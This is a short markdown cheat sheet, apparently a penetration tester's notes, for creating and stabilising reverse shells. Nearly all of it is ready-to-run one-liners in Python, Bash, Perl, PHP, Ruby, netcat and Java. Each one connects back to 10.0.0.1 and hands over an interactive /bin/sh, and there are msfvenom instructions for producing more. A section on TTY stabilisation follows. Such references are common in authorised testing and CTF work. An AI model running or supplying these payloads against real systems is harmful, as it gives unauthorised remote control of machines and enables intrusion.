# Shells - Generating & Stabilising

## Generating
- **Msfvenom way**
```
msfvenom -l payloads | grep "cmd/unix" # Choose from here

msfvenom -p <chosen-payload> LHOST=something LPORT=something R # Get the shell-spawning command shown on screen, copy it and execute on target machine
```
- Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
- Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- PHP
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- nc
```
nc -e /bin/sh 10.0.0.1 1234
OR
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
- Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
~ From [ropnop](https://blog.ropnop.com/) and [PentestMonkey](http://pentestmonkey.net/)

## Stabilising
```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z # background the nc

# In Kali
$ stty -a # Note the terminal dimensions
$ echo $TERM #Note term variable
$ stty raw -echo
$ fg # foreground the nc

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=<term> # what you found above
$ stty rows <num> columns <cols> #what you found above
```
~ From [ropnop](https://blog.ropnop.com/)
